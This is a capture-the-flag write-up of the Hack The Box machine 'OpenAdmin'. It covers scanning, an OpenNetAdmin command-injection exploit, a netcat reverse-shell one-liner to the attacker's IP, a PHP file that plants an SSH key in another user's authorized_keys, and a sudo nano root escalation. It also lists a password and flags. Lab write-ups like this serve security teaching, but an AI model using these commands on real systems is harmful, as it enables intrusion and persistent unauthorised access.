OpenAdmin
===
![OpenAdmin](https://lassa97.github.io/imgs/OpenAdmin.png)

---
### Nmap
We start with an `nmap` scan:

> lassault@kakia:~$ nmap -sV -sC -oA OpenAdmin 10.10.10.171

```
# Nmap 7.80 scan initiated Wed Jan  8 18:44:48 2020 as: nmap -sV -sC -oA OpenAdmin 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.069s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan  8 18:46:21 2020 -- 1 IP address (1 host up) scanned in 92.99 seconds
```

We find `ssh` on port 22 and `http` on port 80.

---

### Web Enumeration
We use `gobuster` to find some useful directories that we can exploit:

> lassault@kakia:~$ gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o OpenAdmin.dir

```
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/08 17:53:21 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
===============================================================
2020/01/08 18:51:04 Finished
===============================================================
```
Going to http://10.10.10.171/music/ shows a login button. We click it and we are redirected to [this](http://10.10.10.171/ona/). It is the OpenNetAdmin Tool running the 18.1.1 version.

---

### Command Injection
Doing some research, we find there is a Remote Code Execution vulnerability (OpenNetAdmin 18.1.1 - Command Injection Exploit).

We take the [source code](https://packetstormsecurity.com/files/155406/opennetadmin1811-exec.txt) and we create a reverse shell. First, we open a local port and then we write this command as input of the exploit.

> lassault@kakia:~$ nc -lvnp 51111
>
> lassault@kakia:~$ ./exploit.sh http://10.10.10.171/ona/
>
> lassault@kakia:~$ mkfifo /tmp/flipper; nc 10.10.15.182 51111 < /tmp/flipper | /bin/sh > /tmp/flipper; rm /tmp/flipper;

---

### Jimmy

After some enumeration, we find some creds (__jimmy:n1nj4w4rri0R!__) in */opt/ona/www/local/config/database_settings.inc.php*
Also, we find two users (__jimmy__ and __joanna__) and a common group (__internal__).
Now, we connect via `ssh` using the creds of __jimmy__:

> lassault@kakia:~$ ssh jimmy@10.10.10.171

---

### Joanna

Once we are logged, we find three local ports open.

> jimmy@openadmin:~$ netstat -nputa

```
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
```

We have the port 53 (*DNS*), the port 3306 (*MySQL*) and the port 52846. Then, we find under */var/www* directory a folder called __internal__. The user __jimmy__ is the owner and the group __internal__ has all the permissions in that directory. Inside it, we find the source code of the *PHP*s that are served in the port 52846.
1) __index.php__: Has a login form with the SHA512 of another pass of __jimmy__.
2) __main.php__: Displays the private key of __joanna__ using *shell_exec()*.
3) __logout.php__: A simple logout.

We decide to create a `ssh` tunnel to display it in our browser:

> lassault@kakia:~$ ssh jimmy@10.10.10.171 -L 55555:127.0.0.1:52846

And going to http://127.0.0.1:55555, we see the login form. Because we have all the permissions in the __internal__ directory, we've decide to create our own PHP that adds a public key to the *authorized_keys* of __joanna__ using the *shell_exec()* function to execute commands.

__flipper.php__

```php
<?php
    shell_exec("cat /var/www/internal/fake.txt >> /home/joanna/.ssh/authorized_keys");
    $keys = shell_exec("cat /home/joanna/.ssh/authorized_keys");
    echo "<pre>" . $keys . "</pre>";
 ?>
```

Then, we generate a new `ssh` key using `ssh-keygen` and we paste the public key inside *fake.txt*. We change the group own of *flipper.php* to __internal__ using `chgrp`. After that, we go to http://127.0.0.1:55555/flipper.php and we can see that we have added our public key to the *authorized_keys* of __joanna__.

Finally, we login with `ssh` using our private key and we have the user flag.

> lassault@kakia:~$ ssh joanna@10.10.10.171 -i OpenAdmin.key
>
> joanna@openadmin:~$ cat /home/joanna/user.txt
`HTB{c9b2cf07d40807e62af62660f0c81b5f}`

---

### Root
We are going to use [GTFOBins](https://gtfobins.github.io/) to gain privilegies. We find that __joanna__ can edit the file */opt/priv* owned by __root__ without password.

> joanna@openadmin:~$ sudo -l
>
`sudo /bin/nano /opt/priv`

Following the instructions for `nano`, we have our root shell and we can own the root flag.

> root@openadmin:~# cat /root/root.txt
`HTB{2f907ed450b361b2c2bf4e8795d5b561}`
